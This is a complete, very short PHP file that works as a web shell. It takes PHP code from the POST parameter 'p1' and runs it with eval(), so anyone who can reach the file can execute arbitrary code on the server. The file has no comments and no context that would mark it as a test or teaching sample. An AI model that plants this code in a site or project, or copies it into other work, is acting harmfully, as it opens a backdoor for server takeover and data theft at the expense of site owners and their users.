<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
}

actionPhp();	
?>